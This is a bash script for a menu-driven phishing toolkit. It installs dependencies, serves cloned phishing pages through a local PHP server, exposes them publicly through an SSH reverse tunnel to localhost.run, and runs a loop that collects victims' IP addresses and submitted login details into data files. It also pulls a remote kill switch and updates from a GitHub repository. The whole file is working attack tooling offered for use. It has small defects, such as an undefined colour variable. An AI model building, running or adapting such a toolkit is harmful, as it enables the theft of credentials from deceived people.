#!/bin/bash

# --- COLOR CODES ---
RED="$(printf '\033[31m')"
GREEN="$(printf '\033[32m')"
YELLOW="$(printf '\033[33m')"
CYAN="$(printf '\033[36m')"
WHITE="$(printf '\033[37m')"
RESET="$(printf '\e[0m')"

# --- GLOBAL VARIABLES ---
HOST="127.0.0.1"
LOG_FILE="script.log"
GIT_REPO="https://github.com/Enthernetcode/work"
CONTROL_URL="https://raw.githubusercontent.com/Enthernetcode/work/main/control.txt"  # Remote kill switch
VERBOSE=false

# --- Enable Debug Mode ---
if [[ $1 == "--debug" ]]; then
    VERBOSE=true
fi

log() {
    echo -e "${CYAN}[LOG]${WHITE} $1" | tee -a $LOG_FILE
}

error() {
    echo -e "${RED}[ERROR]${WHITE} $1" | tee -a $LOG_FILE
}

success() {
    echo -e "${GREEN}[SUCCESS]${WHITE} $1" | tee -a $LOG_FILE
}

# --- REMOTE CONTROL (KILL SWITCH) ---
check_remote_control() {
    log "Checking remote kill switch..."
    local status
    status=$(curl -s "$CONTROL_URL" | tr -d '[:space:]')

    if [[ "$status" == "STOP" ]]; then
        error "Script execution has been disabled by the producer."
        exit 1
    else
        success "Remote check passed. Script is allowed to run."
    fi
}

# --- AUTO-UPDATE SYSTEM ---
auto_update() {
    log "Checking for updates..."
    git fetch origin main &>/dev/null
    LOCAL=$(git rev-parse HEAD)
    REMOTE=$(git rev-parse origin/main)

    if [[ "$LOCAL" != "$REMOTE" ]]; then
        log "New update found! Updating now..."
        git pull origin main
        success "Script updated successfully. Please restart the script."
        exit 0
    else
        success "No new updates available."
    fi
}

# --- TERMINATE PHP PROCESSES ---
kill_pid() {
    local process="php"
    if pidof "$process" > /dev/null; then
        killall "$process" > /dev/null 2>&1
        success "Stopped running PHP processes."
    else
        log "No PHP processes found."
    fi
}

# --- SETUP PHISHING SITE ---
setup_site() {
    clear
    banner
    cd work || { error "Failed to enter work directory."; exit 1; }

    git pull
    log "Updating repository..."
    
    cp -rf .sites/* .server/www
    cp -f .sites/ip.php .server/www/
    
    echo -e "${YELLOW}Enter Port Number to Host On:${RESET}"
    read -r PORT
    
    if ! [[ "$PORT" =~ ^[0-9]+$ ]]; then
        error "Invalid port number. Please enter a number."
        return
    fi
    
    log "Starting PHP server on port $PORT..."
    php -S "$HOST":"$PORT" &>/dev/null &
    success "Server started at http://$HOST:$PORT"
}

# --- MONITOR LOGINS & IP ADDRESSES ---
capture_data() {
    while true; do
        check_remote_control  # Ensure script isn't disabled remotely

        if [[ -f ".server/www/ip.txt" ]]; then
            success "Victim IP captured!"
            cat .server/www/ip.txt >> data/ip_logs.dat
            rm -f .server/www/ip.txt
        fi

        if [[ -f ".server/www/usernames.txt" ]]; then
            success "Login info found!"
            cat .server/www/usernames.txt >> data/usernames.dat
            rm -f .server/www/usernames.txt
        fi

        sleep 1
    done
}

# --- HOST SERVER PUBLICLY ---
host_server() {
    ssh -R 80:localhost:$PORT nokey@localhost.run
}

# --- INSTALL REQUIRED DEPENDENCIES ---
install_dependencies() {
    log "Installing required packages..."
    apt update && apt upgrade -y
    for pkg in php openssh git curl; do
        if ! command -v "$pkg" &>/dev/null; then
            error "$pkg not found, installing..."
            apt install "$pkg" -y
        else
            success "$pkg is already installed."
        fi
    done
}

# --- SETUP GIT CONFIGURATION ---
git_setup() {
    git config --global user.email "test@gmail.com"
    git config --global user.name "test"
}

# --- DISPLAY BANNER ---
banner() {
    printf "${BLUE}
    ███████╗███╗   ██╗████████╗██╗  ██╗███████╗
    ██╔════╝████╗  ██║╚══██╔══╝██║  ██║██╔════╝
    █████╗  ██╔██╗ ██║   ██║   ███████║█████╗  
    ██╔══╝  ██║╚██╗██║   ██║   ██╔══██║██╔══╝  
    ███████╗██║ ╚████║   ██║   ██║  ██║███████╗
    ╚══════╝╚═╝  ╚═══╝   ╚═╝   ╚═╝  ╚═╝╚══════╝${RESET}"
}

# --- MAIN MENU ---
main_menu() {
    while true; do
        clear
        banner
        echo -e "${YELLOW}Select an option:${RESET}"
        echo -e "1) Install dependencies"
        echo -e "2) Setup and start server"
        echo -e "3) Monitor logins & IPs"
        echo -e "4) Check for updates"
        echo -e "5) Kill PHP processes"
        echo -e "6) Exit"
        
        read -rp "Enter your choice: " choice
        
        case $choice in
            1) install_dependencies ;;
            2) setup_site ;;
            3) capture_data ;;
            4) auto_update ;;
            5) kill_pid ;;
            6) exit 0 ;;
            *) error "Invalid choice. Try again." ;;
        esac
        
        read -rp "Press Enter to continue..." _  # Wait before returning to menu
    done
}

# --- INITIAL SETUP & EXECUTION ---
check_remote_control  # Ensure script isn't disabled remotely
auto_update           # Check and apply updates if available
main_menu             # Start menu-driven interaction
